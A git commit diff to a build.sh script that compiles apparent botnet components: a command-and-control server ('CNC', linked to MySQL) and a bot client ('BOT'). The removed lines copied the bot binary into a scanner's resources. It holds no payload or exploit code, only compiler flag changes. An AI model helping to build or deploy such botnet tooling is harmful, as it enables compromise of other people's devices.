855c4701c0767e0f094adaf0458a812339d42731
Your Name <you@example.com>
2018-01-17 10:33:04 -0500

    correction merge

--- build.sh
+++ build.sh
@@ -1,4 +1,2 @@
-gcc CNC/*.c -o cnc.bin -Wall -g -DDEBUG  `mysql_config --cflags --libs`;
-gcc -pthread --std=c99 BOT/*.c -o bot.bin -Wall -g -DDEBUG;
-
-cp ./bot.bin ./scanner/resources/bot2.bin
+gcc --std=c99 CNC/*.c -o cnc.bin -Wall -g -DDEBUG  `mysql_config --cflags --libs`;
+gcc --std=c99 BOT/*.c -o bot.bin -Wall -g -DDEBUG;
